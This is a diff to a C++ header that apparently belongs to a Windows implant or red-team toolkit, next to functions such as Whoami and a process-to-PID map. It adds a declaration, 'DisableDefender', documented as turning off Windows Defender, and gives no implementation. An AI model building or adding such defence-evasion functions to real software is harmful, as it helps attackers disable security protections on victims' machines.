@@ -74,4 +74,9 @@ std::map<std::string, DWORD> GetProcessNameToPIDMap();
 */
 std::string Whoami();
 
+/**
+ * Disable windows defender. Returns TRUE if successful, FALSE otherwise.
+*/
+BOOL DisableDefender();
+
 #endif
